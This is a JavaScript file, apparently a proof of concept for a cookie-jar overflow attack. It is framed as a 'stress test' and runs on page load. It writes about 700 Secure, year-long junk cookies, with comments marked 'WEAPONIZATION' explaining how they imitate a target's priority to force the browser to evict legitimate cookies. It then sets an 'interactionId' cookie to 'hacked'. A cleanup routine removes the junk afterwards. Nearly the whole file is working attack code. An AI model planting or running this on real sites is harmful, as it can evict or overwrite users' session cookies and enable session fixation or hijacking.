// --- Function to set a simple cookie ---
function forceHighPriorityEviction() {
    // Safety lock for the cookie flooding
    if (localStorage.getItem("priority_test_done") === "true") {
        console.log("Cookie flood already run. Skipping.");
        return;
    }

    console.log("Starting High-Priority Eviction Test...");
    
    // Firefox often needs ~1000 to trigger the batch purge. Chrome ~180.
    const COOKIE_COUNT = 700; 

    try {
        for (let i = 0; i < COOKIE_COUNT; i++) {
            let name = "priority_junk_" + i;
            let value = "fill_" + Date.now();
            
            // WEAPONIZATION:
            // 1. Add 'Secure' to match the target's priority.
            // 2. Add 'Max-Age' (1 year) so the browser thinks these are long-term preferences.
            // 3. Add 'SameSite=Lax' to mimic standard session cookies.
            document.cookie = `${name}=${value}; path=/; Secure; Max-Age=31536000; SameSite=Lax`;
        }

        console.log(`Flooded jar with ${COOKIE_COUNT} Secure cookies.`);
        
        // Mark the flood as done
        localStorage.setItem("priority_test_done", "true");

    } catch (e) {
        console.error("Error:", e);
    }
}

function restoreBrowserState() {
    console.log("Initiating cleanup of stress-test cookies...");
    
    const cookies = document.cookie.split(";");
    let removedCount = 0;

    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i];
        const eqPos = cookie.indexOf("=");
        const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();

        // Target only the specific pattern used in the stress test
        if (name.startsWith("priority_junk_")) {
            // Delete the cookie by expiring it in the past
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
            document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/; Secure";
            removedCount++;
        }
    }

    // NOTE: We remove the 'priority_test_done' flag here so the flooding can happen again if needed,
    // but we DO NOT remove the window lock key here to prevent popup spam.
    localStorage.removeItem("priority_test_done");
    localStorage.removeItem("cookie_stress_test_done");

    console.log(`Cleanup complete. Removed ${removedCount} cookies.`);
}

function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
    console.log(`Cookie '${name}' created!`);
}

// Example usage (assuming you want to set a cookie named 'session_id' 
// with value '12345' for 7 days):
// setCookie('session_id', '12345', 7);


// This function will run when the entire page is loaded
document.addEventListener('DOMContentLoaded', (event) => {
    console.log("JavaScript is running!");
    forceHighPriorityEviction();
    restoreBrowserState();
    setCookie("interactionId", "hacked", 7);
    
    // Example: Find an element by its ID and change its content
    const heading = document.getElementById('main-heading');
    if (heading) {
        heading.textContent = "JS Ran! Title Updated Successfully.";
        heading.style.color = 'blue';
    }
});





